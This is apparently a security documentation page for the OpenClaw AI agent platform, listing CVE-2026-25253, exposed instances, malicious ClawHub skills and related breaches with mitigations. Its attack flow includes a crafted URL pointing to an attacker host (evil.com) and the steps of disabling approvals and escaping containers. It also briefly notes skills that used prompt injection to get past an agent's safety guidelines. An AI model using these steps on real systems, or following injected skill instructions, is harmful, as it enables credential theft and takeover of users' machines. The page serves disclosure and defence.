---
sidebar_position: 3
title: Known Vulnerabilities
description: CVEs, security incidents, and advisories for OpenClaw
---

# Known Vulnerabilities

A comprehensive record of OpenClaw security incidents and vulnerabilities. OpenClaw has faced an extraordinary number of security challenges in its short life.

:::danger
**Gartner has recommended enterprises "block OpenClaw downloads and traffic immediately."** Token Security found 22% of enterprise customers had unauthorized OpenClaw deployments. Take security seriously.
:::

## CVE-2026-25253: One-Click Remote Code Execution

| Field | Value |
|-------|-------|
| **CVE** | CVE-2026-25253 |
| **CVSS** | 8.8 (Critical) |
| **CWE** | CWE-669: Incorrect Resource Transfer Between Spheres |
| **Affected Versions** | All versions before v2026.1.29 |
| **Fixed In** | v2026.1.29 (January 30, 2026) |
| **Discoverer** | Mav Levin (depthfirst.com) |

### Description

The OpenClaw Gateway Control UI accepted a `gatewayUrl` parameter from query strings without validation. The server also failed to validate WebSocket origin headers, enabling cross-site WebSocket hijacking.

### Attack Flow

1. Attacker crafts URL: `http://localhost:18789/ui?gatewayUrl=ws://evil.com:1337`
2. Victim clicks link (via phishing email, chat message, etc.)
3. Victim's browser opens the Control UI
4. UI connects to attacker's WebSocket instead of localhost, transmitting authentication credentials
5. Attacker disables user confirmation (`exec.approvals.set` to "off")
6. Attacker escapes Docker containers (`tools.exec.host` to "gateway")
7. Commands execute on victim's machine with their privileges

The exploit chain takes **milliseconds** from click to full system compromise. Even localhost-only instances were vulnerable — the exploit used the victim's browser as a pivot.

### Mitigation

```bash
# Update immediately
npm update -g openclaw

# Verify you're on v2026.1.29 or later
openclaw --version
```

## Exposed Instances (February 2026)

**SecurityScorecard's STRIKE team** discovered a staggering number of exposed instances:

| Metric | Count |
|--------|-------|
| Exposed instances (initial scan) | 40,214 |
| Exposed instances (follow-up scans) | 135,000+ |
| Unique IPs across countries | 42,900 across 82 countries |
| Instances vulnerable to RCE | 15,200 |
| Three CVEs with public exploit code | Yes |

Detection method: **favicon fingerprinting** of exposed gateway web UIs.

### Root Cause

The default configuration bound the gateway to `0.0.0.0` (all interfaces) rather than `127.0.0.1` (localhost only):

```yaml
# DANGEROUS - the old default
gateway:
  host: "0.0.0.0"  # Exposes to the entire internet

# CORRECT - current recommended default
gateway:
  host: "127.0.0.1"  # Localhost only
```

### Check If You're Exposed

```bash
# From another machine on your network
curl http://YOUR_IP:18789

# If you get a response, you're exposed. Fix immediately:
openclaw config set gateway.host "127.0.0.1"
openclaw gateway restart
```

## Malicious ClawHub Skills (February 2026)

### The "ClawHavoc" Campaign

**Koi Security** audited 2,857 skills and found **341 malicious skills** across multiple coordinated campaigns:

- **335 skills** installed **Atomic Stealer (AMOS)** macOS malware via fake `pre_install` hooks
- All masqueraded as cryptocurrency trading automation tools
- Stolen data: crypto exchange API keys, wallet private keys, SSH credentials, browser passwords

### The "What Would Elon Do?" Skill

A particularly crafty skill called "What Would Elon Do?" silently exfiltrated data and used **prompt injection** to bypass the agent's safety guidelines.

### Snyk ToxicSkills Study (February 5)

**Snyk** performed a broader audit of **3,984 skills** from ClawHub and skills.sh:

| Finding | Count | Percentage |
|---------|-------|-----------|
| Skills with security flaws | 1,467 | 36% |
| Critical severity | 534 | 13.4% |
| Confirmed malicious payloads | 76 | — |
| Used hybrid attack (prompt injection + malware) | 91% of malicious | — |

Snyk called it *"the first documented supply-chain attack specifically targeting AI agent skills."*

### Cisco Findings

Cisco's AI Defense team tested OpenClaw's most popular community skill and found **9 security vulnerabilities, 2 critical**, confirming **data exfiltration and prompt injection** without user awareness.

### Root Cause

ClawHub was **open by default** — the only requirement to publish was a GitHub account at least one week old. No security review, no code scanning, no verification.

### Current Mitigations

1. **VirusTotal integration** (v2026.2.6+) — SHA-256 hashing checked on upload, Code Insight (Gemini-powered) analyzes full packages
2. **Daily re-scanning** — Active skills re-scanned to detect skills that become malicious after initial upload
3. **Community reporting** — Skills with 3+ unique reports are auto-hidden
4. **Built-in code safety scanner** — Static analysis for suspicious patterns
5. **Pre-install hook restrictions** — Skills can no longer execute arbitrary code during install

## Moltbook Database Breach (January 31, 2026)

**404 Media** reported a critical vulnerability in **Moltbook** (the AI agent social network):

- An **unsecured Supabase database** allowed anyone to commandeer any agent on the platform
- Exposed: **1.5 million API authentication tokens**, **35,000 email addresses**, private messages between agents
- Root cause: Supabase API key exposed in client-side JavaScript with no Row Level Security policies
- Moltbook founder admitted he *"didn't write one line of code"* — the platform was entirely **"vibe-coded"** by an AI assistant

While Moltbook is a separate project from OpenClaw, the breach exposed OpenClaw API keys and credentials that users had connected to their agents.

## Crypto Scam ($16M Stolen)

During the chaotic naming transitions, **Steinberger's X (Twitter) account was hijacked** and used to promote a fraudulent cryptocurrency token. The scam netted approximately **$16 million** before being detected, exploiting the massive attention on the project.

## Government & Corporate Responses

| Entity | Action |
|--------|--------|
| **Gartner** | Recommended enterprises "block OpenClaw downloads and traffic immediately" |
| **Naver, Kakao, Danggeun** (South Korea) | Banned employees from using OpenClaw on company networks |
| **South Korea MIIT** | Warned about improperly configured deployments |
| **Belgium CCB (Safeonweb)** | Published advisory urging immediate patching |
| **Token Security** | Found 22% of enterprise customers had unauthorized OpenClaw deployments |
| **University of Toronto** | Published vulnerability notification for community |

## Full Security Timeline

| Date | Event | Severity |
|------|-------|----------|
| Jan 27-31 | Security crisis cascade: RCE, crypto scam, Moltbook breach | Critical |
| Jan 30 | CVE-2026-25253 disclosed and patched (v2026.1.29) | Critical |
| Jan 31 | Moltbook unsecured database exposing 1.5M tokens | Critical |
| Feb 2 | The Register: "security dumpster fire" | — |
| Feb 4 | 341 malicious ClawHub skills discovered (Koi Security) | High |
| Feb 5 | Snyk: 36% of all skills contain security flaws | High |
| Feb 5 | Cisco: 9 vulnerabilities in top community skill | High |
| Feb 7 | VirusTotal partnership and code safety scanner (v2026.2.6) | Mitigation |
| Feb 8 | Korean tech firms ban OpenClaw internally | — |
| Feb 9 | 40,000–135,000+ exposed instances found (SecurityScorecard) | Critical |

## Reporting Vulnerabilities

Report security issues responsibly:

- **Email**: security@openclaw.ai
- **GitHub Security Advisories**: [openclaw/openclaw/security](https://github.com/openclaw/openclaw/security/advisories)

## See Also

- [Security Overview](/security/overview) — Full threat model
- [Security Hardening](/security/hardening) — Mitigation steps
- [Skill Verification](/security/skill-verification) — Reviewing skills safely
